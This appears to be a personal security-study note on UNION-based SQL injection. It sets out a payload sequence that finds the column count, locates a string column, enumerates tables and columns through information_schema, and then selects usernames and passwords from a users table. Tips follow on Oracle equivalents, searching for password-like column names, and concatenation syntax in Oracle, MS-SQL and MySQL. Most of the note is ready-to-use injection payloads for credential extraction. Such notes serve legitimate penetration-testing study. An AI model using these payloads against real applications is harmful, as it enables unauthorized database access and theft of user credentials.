### Extracting data
Tags: #sqli 
Related to: 
See also: 
Previous:

### Body
Summary: Should be short, no prose

Notes:
Extracting data with union 
- first find the number of cols
  ref: `Name=Matthew’%20union%20select%20null,null,null,null,null--`
- now verify the first column that has string
  ref: `Name=Matthew’%20union%20select%20’a’,null,null,null,null--`
- find the database tables and column. Use `information_schema`
  ref: `Name=Matthew’%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--`
- extract the data
  ref: `Name=Matthew’%20UNION%20select%20username,password,null,null,null%20from%20users--`

#### tips:
The `information_schema` is supported by `MS-SQL, MySQL,` and many
other databases, including SQLite and Postgresql. It is designed to hold data-
base metadata, making it a primary target for attackers wanting to examine
the database. Note that <mark class="hltr-red">Oracle doesn’t support this schema</mark>. When targeting
an Oracle database, the attack would be identical in every other way. However,
you would use the query `SELECT table_name,column_name FROM all_tab_`
columns to retrieve information about tables and columns in the database.
(You would use the `user_tab_columns table` to focus on the current database
only.) When analyzing large databases for points of attack, it is usually best to
look directly for interesting column names rather than tables. 
For instance:
```
SELECT table_name,column_name FROM information_schema.columns where
column_name LIKE ‘%PASS%’
```

#### tips:
retrieving multiple data from a single column:
`' UNION SELECT username || '~' || password FROM users--`


#### tips

When multiple columns are returned from a target table, these can be
concatenated into a single column. This makes retrieval more straightforward,
because it requires identification of only a single varchar field in the original
query:
```
-  Oracle: SELECT table_name||’:’||column_name FROM all_tab_columns
-  MS-SQL: SELECT table_name+’:’+column_name from information_schema.columns
-  MySQL: SELECT CONCAT(table_name,’:’,column_name) from information_schema.columns
```


### References
- [[]]